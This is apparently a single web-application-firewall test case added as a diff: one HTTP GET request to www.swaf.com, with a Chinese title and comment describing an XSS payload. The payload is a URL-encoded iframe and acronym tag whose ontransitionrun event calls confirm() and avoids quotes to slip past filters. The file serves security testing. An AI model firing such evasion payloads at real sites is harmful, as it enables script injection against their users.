@@ -1,0 +1,9 @@
+# XSS跨站脚本_GET_常规_事件_acronym标签_ontransitionrun事件-06506595
+# 攻击载荷利用了HTML中的acronym标签和ontransitionrun属性，触发confirm()函数，显示一个提示框。当 CSS 过渡开始时触发，未使用单引号和双引号绕过测试
+GET /?id=%3Ciframe%20onload=%22src=src+%27%23x%27%22%20src=%22https:%2F%2Ftest.com%2Fxss%2Fxss.php%3Fx=%3Cstyle%3E:target%20%7Btransform:%20rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Cacronym%20id=x%20style=%2522transition:transform%202s%2522%20ontransitionrun=confirm%28%2Fxss%2F%29%3E%3C%2Facronym%3E%22%3E&bid=hd_tag_m8mv266s HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv266s
+RM-PRO-Token: 9448bf2bfd09301f5a21283b84c04d42
+RM-PRO-Time: 1742808550101
+User-Agent: curl/7.83.1
+
